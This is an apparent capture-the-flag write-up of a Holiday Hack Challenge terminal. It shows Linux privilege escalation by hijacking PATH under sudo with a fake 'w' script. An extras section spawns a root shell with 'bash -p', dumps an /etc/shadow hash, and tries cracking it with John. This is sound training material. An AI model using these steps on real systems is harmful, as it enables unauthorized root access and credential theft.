---
title: "Neighborhood Watch Bypass"
tags:
- Linux/privesc/path-hijacking
Difficulty: ❄️----
order: 3
showToc: true
---
👨‍💻 Challenge provided by: [[Kyle Parrish]]  
🗺️ Location: The Neighborhood - Area: City. Coordinates: 62, 38  
🔗 Challenge URL: [Neighborhood Fire Alarm System Terminal](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termDosisAlarm)

## Challenge Description

```
Assist Kyle at the old data center with a fire alarm that just won't chill.
```

## Helpful References

[GitHub - SubhaDip003 - Linux Privilege Escalation Guide](https://github.com/SubhaDip003/Linux-Privilege-Escalation)

## Solution

Click on the **"Neighborhood Fire Alarm System"** terminal to start the challenge.

![[fire_alarm_panel.png]]

Once you access the terminal, you will be presented with the following description:

```
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
              DOSIS NEIGHBORHOOD FIRE ALARM SYSTEM - LOCKOUT MODE
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨

🚨 EMERGENCY ALERT: Fire alarm system admin access has been compromised! 🚨
The fire safety systems are experiencing interference and 
admin privileges have been mysteriously revoked. The neighborhood's fire 
protection infrastructure is at risk!

⚠️ CURRENT STATUS: Limited to standard user access only
🔒 FIRE SAFETY SYSTEMS: Partially operational but restricted
🎯 MISSION CRITICAL: Restore full fire alarm system control

Your mission: Find a way to bypass the current restrictions and elevate to 
fire safety admin privileges. Once you regain full access, run the special 
command `/etc/firealarm/restore_fire_alarm` to restore complete fire alarm system control and 
protect the Dosis neighborhood from potential emergencies.

🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
```

From the description above, it is clear that we need to find a privilege escalation. Let's try `sudo -l` to enumerate if there are any commands we can run with `sudo`:

```sh
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo -l
Matching Defaults entries for chiuser on 898ddecf0e85:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 898ddecf0e85:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

We can execute `sudo /usr/local/bin/system_status.sh` without a password. In addition, we can see that `secure_path`, which defines the PATH environment variable that `sudo` uses when executing commands, is defined twice. The first one is the default global setting (which is applied to all users) and the second one is a user-specific override. `sudo` will always apply the most specific rule, which means the second `secure_path` entry takes precedence:

```sh
secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH
```

Also, we can see `env_keep+=PATH` which means the user will keep its own path when running `sudo`. Normally, `env_keep+=PATH` preserves the user's `PATH`, but under certain conditions `secure_path` still takes precedence. In this case, both are the same as we can see below:

```sh
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo $PATH
/home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

What matters from all the above for our privilege escalation, is that there is a directory for which we have write permissions in the path: `/home/chiuser/bin`. In addition, because it is the first one in the path, the OS will search there first for any executable. If `/usr/local/bin/system_status.sh` calls any external command without an absolute path, we can abuse the execution order by placing a malicious executable with the same name at `/home/chiuser/bin` and ours will be executed instead of the legitimate executable.

Let's check then the content of `/usr/local/bin/system_status.sh`:

```sh
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

We can see that the script calls a file called `w`. To finish the challenge, we can simply create  `/home/chiuser/bin/w` with the following content, which will run `/etc/firealarm/restore_fire_alarm` with root permissions:

```sh
#!/bin/bash

/etc/firealarm/restore_fire_alarm
```

After creating `w` with our malicious content, make sure you make the file executable and then we just need to call `sudo /usr/local/bin/system_status.sh`:

```sh
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ chmod u+x w
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh

Sucess!

Active fire department connections:
🔥🚨 FIRE ALARM SYSTEM: Attempting to restore admin privileges...
🔒 BYPASSING SECURITY RESTRICTIONS...
📡 Connecting to fire safety control center: https://2025.holidayhackchallenge.com:443/turnstile?rid=7fb0d1b7-6b48-4e40-90db-3555c17ff749
🎯 SUCCESS! Fire alarm system admin access RESTORED!
🚨 DOSIS NEIGHBORHOOD FIRE PROTECTION: FULLY OPERATIONAL
✅ All fire safety systems are now under proper administrative control
🔥 Emergency response capabilities: ACTIVE
🏠 Neighborhood fire protection: SECURED

======================================================================
   CONGRATULATIONS! You've successfully restored fire alarm system
   administrative control and protected the Dosis neighborhood!
======================================================================

🔥🚨 FIRE ALARM SYSTEM RESTORATION COMPLETE 🚨🔥

Fire alarm monitoring processes:
root         112  0.0  0.0   3472  1680 pts/1    S+   18:39   0:00 grep -E (alarm|fire|monitor|safety)

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
```

## Extras

If you want a full root shell, you can make your `w` file to look as follow:

```sh
#!/bin/bash
/bin/bash -p
```

The `-p` flag tells Bash to preserve the effective UID and GID when starting a new shell. Normally, when Bash detects it is running with elevated privileges (for example, via SUID root), it drops privileges for security reasons. But with `-p`, Bash does not drop privileges.

I used this to further enumerate the terminal and try to find additional pieces of information.

I checked the `/etc/shadow` file and the user root had no password set. The chiuser password was hashed using yescrypt:

```sh
root:*:20362:0:99999:7:::
...truncated...
chiuser:$y$j9T$jNusw/plDY4ikwD66SjMU/$zLFY4lHgomQsVvHTtrLhH8uV9VNZPUCdJYMG2HoeJnC:20367:0:99999:7:::
```

You can try to crack it with John:

```sh
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

yescrypt is relatively new and it was designed to make brute forcing expensive. It requires a significant amount of memory and it involves multiple rounds of hashing per attempt. Long story short, I could not retrieve the password.